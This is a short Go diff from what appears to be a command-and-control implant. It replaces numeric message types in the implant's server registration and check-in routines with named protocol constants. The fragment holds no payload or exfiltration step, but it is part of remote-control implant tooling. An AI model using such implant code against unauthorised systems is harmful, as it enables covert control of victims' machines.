@@ -77,7 +77,7 @@ func initialize() bool {
 		if err != nil {
 			continue
 		}
-		err = SendEnvelopeToServer(conn, 0, msg)
+		err = SendEnvelopeToServer(conn, communication.IMPLANT_REGISTER_REQ, msg)
 		if err != nil {
 			conn.Close()
 			continue
@@ -88,7 +88,7 @@ func initialize() bool {
 			conn.Close()
 			continue
 		}
-		if messageType != 1 { //server should send a ImplantRegisterResp message
+		if messageType != communication.IMPLANT_REGISTER_RESP { //server should send a ImplantRegisterResp message
 			conn.Close()
 			continue
 		}
@@ -108,7 +108,7 @@ func initialize() bool {
 func checkIn(conn net.Conn) (*[]int, *[]interface{}, error) {
 	msg := communication.ImplantCheckinReq{ImplantId: implantId}
 
-	err := SendEnvelopeToServer(conn, 2, msg)
+	err := SendEnvelopeToServer(conn, communication.IMPLANT_CHECKIN_REQ, msg)
 	if err != nil {
 		return nil, nil, err
 	}
@@ -117,7 +117,7 @@ func checkIn(conn net.Conn) (*[]int, *[]interface{}, error) {
 	if err != nil {
 		return nil, nil, err
 	}
-	if messageType != 3 {
+	if messageType != communication.IMPLANT_CHECKIN_RESP {
 		return nil, nil, errors.New("Expected implantCheckinResp but got: " + strconv.Itoa(messageType))
 	}
 	checkInResp, ok := data.(*communication.ImplantCheckinResp)
